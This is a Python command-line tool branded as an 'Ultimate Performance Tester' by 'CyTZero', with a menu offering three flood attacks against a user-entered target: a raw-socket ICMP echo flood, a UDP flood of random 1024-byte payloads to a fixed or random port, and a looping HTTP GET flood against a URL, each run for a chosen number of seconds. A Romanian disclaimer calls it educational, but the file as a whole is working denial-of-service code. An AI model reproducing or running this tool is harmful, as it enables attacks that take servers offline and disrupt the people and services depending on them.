import os
import time
import socket
import random
import requests
from colorama import init, Fore, Style

init()

def print_ascii_art():
    art = f"""
{Fore.RED}
██████╗ ███████╗████████╗███╗   ██╗███████╗████████╗███████╗██████╗ 
██╔══██╗██╔════╝╚══██╔══╝████╗  ██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗
██████╔╝█████╗     ██║   ██╔██╗ ██║█████╗     ██║   █████╗  ██████╔╝
██╔═══╝ ██╔══╝     ██║   ██║╚██╗██║██╔══╝     ██║   ██╔══╝  ██╔═══╝ 
██║     ███████╗   ██║   ██║ ╚████║███████╗   ██║   ███████╗██║     
╚═╝     ╚══════╝   ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚══════╝╚═╝     
             {Fore.YELLOW}★ Ultimate Performance Tester by CyTZero ★{Style.RESET_ALL}
"""
    print(art)

def print_menu():
    menu = f"""
{Fore.RED}╔════════════════════════════════════════════════════════════╗
║                        {Fore.YELLOW}MAIN MENU                           {Fore.RED}║
╠════════════════════════════════════════════════════════════╣
║ {Fore.RED}[1]{Fore.WHITE} 🚀 {Fore.YELLOW}ICMP Flood Test                                           {Fore.RED}║
║ {Fore.RED}[2]{Fore.WHITE} 🎯 {Fore.YELLOW}Random Packet Flood Test                                  {Fore.RED}║
║ {Fore.RED}[3]{Fore.WHITE} 🌐 {Fore.YELLOW}HTTP Request Flood Test                                   {Fore.RED}║
║ {Fore.RED}[4]{Fore.WHITE} ❌ {Fore.YELLOW}Exit                                                     {Fore.RED}║
╚════════════════════════════════════════════════════════════╝
"""
    print(menu)

def print_disclaimer():
    disclaimer = f"""
{Fore.RED}⚠ DISCLAIMER ⚠{Style.RESET_ALL}
Acest script este destinat doar pentru scopuri educaționale și teste responsabile.
Utilizarea acestui script fără permisiunea explicită a proprietarului serverului este ilegală și lipsită de etică.
{Fore.YELLOW}Folosirea acestui script este pe propria răspundere.{Style.RESET_ALL}
"""
    print(disclaimer)

def send_icmp_flood(target_ip, duration):
    print(f"{Fore.RED}➡ {Fore.YELLOW}Starting ICMP Flood to {target_ip} for {duration} seconds...{Style.RESET_ALL}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    packet = b'\x08\x00' + b'\x00' * 46
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            sock.sendto(packet, (target_ip, 0))
        except Exception as e:
            print(f"{Fore.RED}⚠ Error: {e}{Style.RESET_ALL}")

def send_random_packet_flood(target_ip, target_port, duration):
    print(f"{Fore.RED}➡ {Fore.YELLOW}Starting Random Packet Flood to {target_ip}:{target_port} for {duration} seconds...{Style.RESET_ALL}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    message = os.urandom(1024)
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            port = target_port or random.randint(1, 65535)
            sock.sendto(message, (target_ip, port))
        except Exception as e:
            print(f"{Fore.RED}⚠ Error: {e}{Style.RESET_ALL}")

def send_custom_http_flood(url, duration):
    print(f"{Fore.RED}➡ {Fore.YELLOW}Starting HTTP Request Flood to {url} for {duration} seconds...{Style.RESET_ALL}")
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            requests.get(url, timeout=5)
        except Exception as e:
            print(f"{Fore.RED}⚠ Error: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    print_ascii_art()
    print_disclaimer()

    while True:
        print_menu()
        choice = input(f"{Fore.YELLOW}🎯 {Fore.RED}Select an option: {Style.RESET_ALL}")
        
        if choice == '1':
            target_ip = input(f"{Fore.RED}Enter target IP for ICMP Flood: {Style.RESET_ALL}")
            duration = int(input(f"{Fore.RED}Enter duration (in seconds): {Style.RESET_ALL}"))
            send_icmp_flood(target_ip, duration)
        elif choice == '2':
            target_ip = input(f"{Fore.RED}Enter target IP for Random Packet Flood: {Style.RESET_ALL}")
            target_port = int(input(f"{Fore.RED}Enter target port (0 for random): {Style.RESET_ALL}"))
            duration = int(input(f"{Fore.RED}Enter duration (in seconds): {Style.RESET_ALL}"))
            send_random_packet_flood(target_ip, target_port, duration)
        elif choice == '3':
            target_url = input(f"{Fore.RED}Enter target URL for HTTP Flood: {Style.RESET_ALL}")
            duration = int(input(f"{Fore.RED}Enter duration (in seconds): {Style.RESET_ALL}"))
            send_custom_http_flood(target_url, duration)
        elif choice == '4':
            print(f"{Fore.RED}❌ {Fore.YELLOW}Exiting... Stay safe!{Style.RESET_ALL}")
            break
        else:
            print(f"{Fore.RED}⚠ Invalid option! Please try again.{Style.RESET_ALL}")
